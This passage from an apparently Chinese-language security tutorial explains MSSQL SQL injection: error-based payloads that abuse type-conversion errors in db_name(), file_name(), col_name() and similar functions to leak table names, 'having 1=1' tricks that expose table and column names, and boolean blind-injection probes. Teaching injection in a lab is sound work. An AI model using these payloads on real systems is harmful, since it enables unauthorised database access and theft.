style="color:#999988;font-style:italic">返回nvarchar(128)</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">*/</span><br></span></code></pre></div></div>
<p><strong>报错原理：</strong></p>
<p>会强制将 <code>database_id</code> 的值转换为 <code>smallint</code>类型，而查询出来的结果为<code>nvarchar</code>，因此导致抛出异常</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> test</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;u&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> name </span><span class="token operator" style="color:#393A34">not</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;users&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--+</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/1632283144595-3a3145b8-468d-4694-ae24-5a42d50a8c06-ad711968226b4f139c514d76440c8153.png" width="1298" height="346" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="file_name">file_name()<a href="#file_name" class="hash-link" aria-label="file_name()的直接链接" title="file_name()的直接链接">​</a></h4>
<p><strong>函数说明：</strong></p>
<p>此函数返回给定文件标识 (ID) 号的逻辑文件名</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">file_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">id</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/* *</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">其文件名的文件标识号FILE_NAME。file_id具有int数据类型。返回nvarchar(128)</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">file_ID对应于 sys.master_files 目录视图或 sys.database_files 目录视图中的 file_id 列。</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">*/</span><br></span></code></pre></div></div>
<p><strong>报错原理：</strong></p>
<p>和上面一样，类型转换出错，下面一样的就不再写原理了</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> file_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> test</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;u&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> name </span><span class="token operator" style="color:#393A34">not</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;users&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--+</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="filegroup_name">filegroup_name()<a href="#filegroup_name" class="hash-link" aria-label="filegroup_name()的直接链接" title="filegroup_name()的直接链接">​</a></h4>
<p><strong>函数说明：</strong></p>
<p>此函数返回指定文件组标识 (ID) 号的文件组名称。</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">FILEGROUP_NAME </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> filegroup_id </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/* *</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">filegroup_id: 将返回其文件组名称 FILEGROUP_NAME 的文件组 ID 号，filegroup_id 具有 smallint 数据类型。</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">*/</span><br></span></code></pre></div></div>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> filegroup_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> test</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;u&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> name </span><span class="token operator" style="color:#393A34">not</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;users&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--+</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="col_name">col_name()<a href="#col_name" class="hash-link" aria-label="col_name()的直接链接" title="col_name()的直接链接">​</a></h4>
<p><strong>函数说明：</strong></p>
<p>此函数根据表列的表标识号和列标识号值返回表列的名称</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">COL_NAME </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> table_id </span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> column_id </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/* *</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">table_id 自变量具有一个 int 数据类型</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">column_id 自变量具有一个 int 数据类型,返回系统名称</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">*/</span><br></span></code></pre></div></div>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> col_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> test</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;u&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> name </span><span class="token operator" style="color:#393A34">not</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;users&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--+</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="object_name">object_name()<a href="#object_name" class="hash-link" aria-label="object_name()的直接链接" title="object_name()的直接链接">​</a></h4>
<p><strong>函数说明：</strong></p>
<p>此函数返回架构范围内对象的数据库对象名称</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">OBJECT_NAME </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> object_id </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> database_id </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/* *</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">object_id 的数据类型为 int，并假定为指定数据库或当前数据库上下文中的架构范围内的对象</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">database_id 的数据类型为 int。要在其中查找对象的数据库的 ID</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">返回sysname</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">*/</span><br></span></code></pre></div></div>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> object_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> test</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;u&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> name </span><span class="token operator" style="color:#393A34">not</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;users&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--+</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="type_name">type_name()<a href="#type_name" class="hash-link" aria-label="type_name()的直接链接" title="type_name()的直接链接">​</a></h4>
<p><strong>函数说明：</strong></p>
<p>返回指定类型 ID 的未限定的类型名称</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">TYPE_NAME </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> type_id </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/* *</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">type_id 的数据类型为 int，它可以引用调用方有权访问的任意架构中的类型。返回sysname</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">*/</span><br></span></code></pre></div></div>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> type_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> test</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;u&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> name </span><span class="token operator" style="color:#393A34">not</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;users&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--+</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="schema_name">schema_name()<a href="#schema_name" class="hash-link" aria-label="schema_name()的直接链接" title="schema_name()的直接链接">​</a></h4>
<p><strong>函数说明：</strong></p>
<p>返回与架构 ID 关联的架构名称</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SCHEMA_NAME </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> schema_id </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">/</span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">schema_id	架构的 ID。 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">schema_id 是 </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain">。如果没有定义 schema_id，则 SCHEMA_NAME 将返回调用方的默认架构的名称。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">schema_id 不是有效 ID 时，返回 </span><span class="token boolean" style="color:#36acaa">NULL</span><span class="token plain">。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">/</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="其他函数">其他函数<a href="#其他函数" class="hash-link" aria-label="其他函数的直接链接" title="其他函数的直接链接">​</a></h4>
<p>上面连续很多的函数都是参数类型的问题，导致异常，其他还有很多，比如</p>
<ul>
<li>SUSER_NAME()</li>
<li>USER_NAME()</li>
<li>PERMISSIONS()</li>
<li>...</li>
</ul>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="having-11-爆表名">having 1=1 爆表名<a href="#having-11-爆表名" class="hash-link" aria-label="having 1=1 爆表名的直接链接" title="having 1=1 爆表名的直接链接">​</a></h4>
<p><strong>说明：</strong></p>
<p>having需要与聚合函数group by一起使用，当无<code>group by</code>时，会直接爆出当前表</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">having</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image.png" src="/assets/images/1632291216427-cc5f2b7d-fa66-4100-b9a3-a249b24c9b0c-6402fe7ba455d3c741f50c23397d21b4.png" width="1293" height="317" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="group-by--having-11-爆列名">group by ... having 1=1 爆列名<a href="#group-by--having-11-爆列名" class="hash-link" aria-label="group by ... having 1=1 爆列名的直接链接" title="group by ... having 1=1 爆列名的直接链接">​</a></h4>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">group</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> username</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">id </span><span class="token keyword" style="color:#00009f">having</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image.png" src="/assets/images/1632291341405-0cea601b-0edd-4d14-8544-4f152f6078a6-8f56d35b7fd01812d928df47aab4efb6.png" width="1305" height="345" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="盲注">盲注<a href="#盲注" class="hash-link" aria-label="盲注的直接链接" title="盲注的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="布尔盲注">布尔盲注<a href="#布尔盲注" class="hash-link" aria-label="布尔盲注的直接链接" title="布尔盲注的直接链接">​</a></h3>
<p>也和mysql一样，不过是一些语句的差异，主要利用语法</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 如果condition为真，那么整条where语句仍然为真</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 如果condition为假，那么整条where语句为假</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> username</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">$username </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">condition</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="注入判断">注入判断<a href="#注入判断" class="hash-link" aria-label="注入判断的直接链接" title="注入判断的直接链接">​</a></h4>
<p>一般通过一些表达式的差异性来确认结果</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">6</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- 正常回显</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223101950716" src="/assets/images/image-20211223101950716-429089993ed5fe0cbc629280650455ba.png" width="1922" height="220" class="img_ev3q"></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token operator" style="color:#393A34">*</span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- 错误回显</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223102904970" src="/assets/images/image-20211223102904970-ca24904b7aae1e4acde493c6db61f69a.png" width="1924" height="268" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="常用函数">常用函数<a href="#常用函数" class="hash-link" aria-label="常用函数的直接链接" title="常用函数的直接链接">​</a></h4>
<ul>
<li>len()</li>
<li>ascii()</li>
<li>substring()</li>
<li>count()</li>
</ul>
